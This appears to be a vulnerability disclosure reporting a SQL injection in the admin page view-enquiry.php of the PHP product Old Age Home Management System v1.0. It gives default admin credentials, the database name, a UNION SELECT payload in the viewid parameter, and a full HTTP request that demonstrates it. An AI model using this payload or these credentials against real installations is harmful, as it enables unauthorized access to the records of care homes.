# Old Age Home Management System v1.0 by ANUJ KUMAR has SQL injection

BUG_Author: WuQi Qi and Zhihong Tian, Guangzhou University

vendors: https://phpgurukul.com/old-age-home-management-system-using-php-and-mysql/#google_vignette

Admin account password： admin/Test@123

The program is built using the xmapp-php8.1 version

Vulnerability File: /oahms/admin/view-enquiry.php?viewid=

Vulnerability location: /oahms/admin/view-enquiry.php?viewid=, id

dbname =oahmsdb

[+] Payload: /oahms/admin/view-enquiry.php?viewid=-1%20union%20select%201,2,3,database(),5,6,7,8 // Leak place ---> id

```sql
GET /oahms/admin/view-enquiry.php?viewid=-1%20union%20select%201,2,3,database(),5,6,7,8 HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=pdgj6o3q36155575ehkd7krt8h
Connection: close
```

![image](https://github.com/assets/54017627/4795c27c-ee7b-472e-9ed3-8889c02f8392)
